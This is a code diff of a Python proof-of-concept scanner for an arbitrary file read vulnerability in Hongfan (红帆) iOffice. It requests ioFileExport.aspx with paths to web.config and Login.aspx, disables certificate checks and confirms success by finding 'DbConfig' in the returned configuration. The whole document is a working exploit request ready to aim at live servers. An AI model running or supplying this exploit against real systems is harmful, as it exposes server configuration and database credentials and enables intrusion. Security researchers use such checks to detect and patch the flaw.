@@ -13,16 +13,21 @@ def now_time():
 
 
 def main(url):
-    target_url = url + "ioffice/prg/set/iocom/ioFileExport.aspx?url=/ioffice/web.config&filename=test.txt&ContentType=application/octet-stream"
+    target_url1 = url + "ioffice/prg/set/iocom/ioFileExport.aspx?url=/ioffice/web.config&filename=test.txt&ContentType=application/octet-stream"
+    target_url2 = url + "ioffice/prg/set/iocom/ioFileExport.aspx?url=/ioffice/Login.aspx&filename=test.txt&ContentType=application/octet-stream"
+    
     headers = {
         "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Mobile Safari/537.36"
     }
     console.print(now_time() + " [INFO]     正在检测红帆任意文件读取漏洞", style='bold blue')
     try:
         urllib3.disable_warnings()
-        res = requests.get(url=target_url, headers=headers, verify=False, timeout=10)
-        if res.status_code == 200:
-            console.print(now_time() + " [SUCCESS]     存在红帆任意文件读取:{}".format(target_url), style='bold green')
+        res1 = requests.get(url=target_url1, headers=headers, verify=False, timeout=10)
+        res2 = requests.get(url=target_url2, headers=headers, verify=False, timeout=10)
+        if res1.status_code == 200 and "DbConfig" in res1.text:
+            console.print(now_time() + " [SUCCESS]     存在红帆任意文件读取:{}".format(target_url1), style='bold green')
+        if res2.status_code == 200:
+            console.print(now_time() + " [SUCCESS]     存在红帆任意文件读取:{}".format(target_url2), style='bold green')
         else:
             console.print(now_time() + " [WARNING]  不存在红帆任意文件读取", style='bold red')
     except Exception as e:
